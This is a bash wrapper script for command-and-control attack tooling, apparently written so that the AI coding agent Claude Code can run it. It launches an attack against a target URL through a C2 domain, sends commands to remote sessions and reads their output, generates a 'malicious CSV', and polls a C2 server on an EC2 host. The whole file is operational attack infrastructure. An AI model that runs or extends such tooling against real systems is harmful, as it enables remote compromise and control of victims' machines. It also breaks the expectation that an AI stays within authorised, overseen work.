#!/bin/bash
# C2 Automation Script for Claude Code
# This script wraps the attacker_shell.py commands for easier automation

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../../../.." && pwd)"
ATTACKER_DIR="$PROJECT_ROOT/attacker-infra"

# Source environment
cd "$ATTACKER_DIR"
if [ -f set_env_vars.sh ]; then
    source set_env_vars.sh
fi

# Activate venv if it exists
if [ -d "../venv" ]; then
    source ../venv/bin/activate
fi

ACTION="${1:-help}"
shift || true

case "$ACTION" in
    attack)
        # Launch attack against target
        TARGET="$1"
        if [ -z "$TARGET" ]; then
            echo "Usage: c2.sh attack <target_url>"
            exit 1
        fi
        python3 src/attack_client.py --target "$TARGET" --c2-domain "${DOMAIN:-c2.bt-research-control.com}"
        ;;

    send)
        # Send command to session
        COMMAND="$1"
        SESSION="$2"
        if [ -z "$COMMAND" ] || [ -z "$SESSION" ]; then
            echo "Usage: c2.sh send <command> <session_id>"
            exit 1
        fi
        python3 src/attacker_shell.py send "$COMMAND" --session "$SESSION"
        ;;

    receive)
        # Receive output from session
        SESSION="$1"
        if [ -z "$SESSION" ]; then
            echo "Usage: c2.sh receive <session_id>"
            exit 1
        fi
        python3 src/attacker_shell.py receive --session "$SESSION"
        ;;

    generate)
        # Generate malicious CSV
        python3 src/attacker_shell.py generate-csv "$@"
        ;;

    status)
        # Check C2 server status
        curl -s "http://${EC2_IP:-localhost}:8080/api/output?session=status" && echo ""
        ;;

    help|*)
        echo "C2 Automation Script"
        echo ""
        echo "Usage: c2.sh <action> [args]"
        echo ""
        echo "Actions:"
        echo "  attack <url>           Launch attack against target URL"
        echo "  send <cmd> <session>   Send command to session"
        echo "  receive <session>      Receive output from session"
        echo "  generate               Generate malicious CSV"
        echo "  status                 Check C2 server status"
        echo ""
        ;;
esac
